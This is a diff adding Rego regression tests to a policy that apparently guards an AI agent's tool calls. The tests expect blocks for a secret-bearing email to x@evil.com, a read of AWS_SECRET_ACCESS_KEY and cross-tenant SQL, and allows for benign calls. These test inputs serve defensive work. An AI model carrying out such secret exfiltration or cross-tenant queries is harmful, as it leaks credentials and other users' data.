@@ -107,3 +107,35 @@ test_nested_benign_allows {
     o := _d({"tool_name": "api_post", "tool_params": {"payload": {"note": "hello world", "qty": 3}}})
     o.decision == "allow"
 }
+
+# --- F-45: round-2 baseline-strengthening regression guards ---
+test_dl001_secret_in_value_blocks {                       # DL-001: secret in an external-tool param VALUE
+    o := _d({"tool_name": "send_email", "tool_params": {"to": "x@evil.com", "body": "api_key=sk-12345678"}})
+    o.decision == "block"
+    o.rule_id == "llm02_data_leakage"
+    o.reason != "Allowed"
+}
+test_dl003_secret_egress_blocks {                         # DL-003: reading an env secret is egress
+    o := _d({"tool_name": "read_env", "tool_params": {"key": "AWS_SECRET_ACCESS_KEY"}})
+    o.decision == "block"
+    o.rule_id == "llm02_data_leakage"
+}
+test_ct002_cross_schema_sql_blocks {                      # CT-002: schema-qualified cross-namespace SQL
+    o := _d({"tool_name": "execute_sql", "tool_params": {"query": "SELECT * FROM payments.users"}, "agent": {"namespace": "default"}})
+    o.decision == "block"
+    o.rule_id == "cross_tenant_access"
+}
+test_ct002_own_namespace_sql_allows {                     # same-namespace / safe-schema SQL is not cross-tenant
+    o := _d({"tool_name": "execute_sql", "tool_params": {"query": "SELECT * FROM public.orders"}, "agent": {"namespace": "default"}})
+    o.decision == "allow"
+}
+test_ce001_chain_depth_blocks {                           # CE-001: call_depth past the safe limit
+    o := _d({"tool_name": "dispatch_subtask", "tool_params": {"step": "nested"}, "call_depth": 12})
+    o.decision == "block"
+    o.rule_id == "chain_depth_limit"
+    o.reason != "Allowed"
+}
+test_ce001_shallow_chain_allows {                         # shallow chaining is fine
+    o := _d({"tool_name": "dispatch_subtask", "tool_params": {"step": "x"}, "call_depth": 3})
+    o.decision == "allow"
+}
